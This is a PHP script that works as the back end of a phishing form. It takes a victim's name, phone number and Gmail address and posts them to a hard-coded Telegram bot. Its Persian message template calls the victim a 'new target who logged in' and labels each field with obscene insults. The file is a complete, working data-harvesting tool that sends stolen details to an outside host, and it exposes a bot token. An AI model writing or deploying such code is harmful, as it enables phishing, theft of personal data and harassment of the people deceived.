<?php
$name = $_POST['name'];
$phone = $_POST['phone'];
$gmail = $_POST['gmail'];
if ($gmail == null) {
echo json_encode(array('status' => '0', 'message' => 'ایمیل خود را وارد کنید'));
}elseif ($phone == null) {
echo json_encode(array('status' => '0', 'message' => 'شماره همراه خود را وارد کنید'));
} elseif($name == null) {
echo json_encode(array('status' => '0', 'message' => ' نام و نام خانوادگی خود را وارد کنید'));
} else {

$id = "-5066991479";     // chatId Admin
$token = '6980095826:AAGWcMZEsViOpSb0z-HrvzxzSMWKPrN8BMU';  // robot Token
$des = "  
تارگت جدید لاگین کرد 🤡
➖➖➖➖➖➖➖
اسم کیریش : <code>$name</code>
شماره مادر جندش : <code>$phone</code>
جیمیل کونیش : <code>$gmail</code>
➖➖➖➖➖➖➖
";
    $send = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($des) . '&parse_mode=HTML';
    $params = [
'chat_id' => $id,
'text' => $des,
'parse_mode' => 'HTML'
];
    $website = "https://api.telegram.org/bot" . $token;
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
      echo json_encode(array('status' => '1', 'message' => 'موفقیت آمیز'));
}


